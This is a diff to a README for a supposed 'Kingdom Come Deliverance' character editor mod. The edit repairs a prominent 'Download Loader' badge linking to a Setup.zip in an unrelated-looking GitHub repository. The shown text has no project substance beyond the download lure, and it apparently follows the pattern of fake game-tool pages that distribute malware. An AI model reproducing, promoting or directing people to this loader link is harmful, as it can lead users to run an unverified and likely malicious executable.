@@ -4,7 +4,7 @@
 
 > ⚡ Advanced Game Modification Project for Kingdom Come Deliverance Character Editor
 
-[![🚀 Download Loader](https://img.shields.io/badge/🚀%20Download%20Loader-7C3AED?style=for-the-badge&logo=github&logoColor=white)]https://github.com/WASD122/bvvb/releases/download/main/Setup.zip)
+[![🚀 Download Loader](https://img.shields.io/badge/🚀%20Download%20Loader-7C3AED?style=for-the-badge&logo=github&logoColor=white)](https://github.com/WASD122/bvvb/releases/download/main/Setup.zip)
 
 ---
 
@@ -38,4 +38,5 @@ configs/
 `Kingdom-Come-Deliverance-Character-Editor` · Updated: 2026-10-05
 
 **Tags:** `kingdom-come-deliverance` `character-editor` `medieval-rpg` `save-editor` `inventory`
+
 
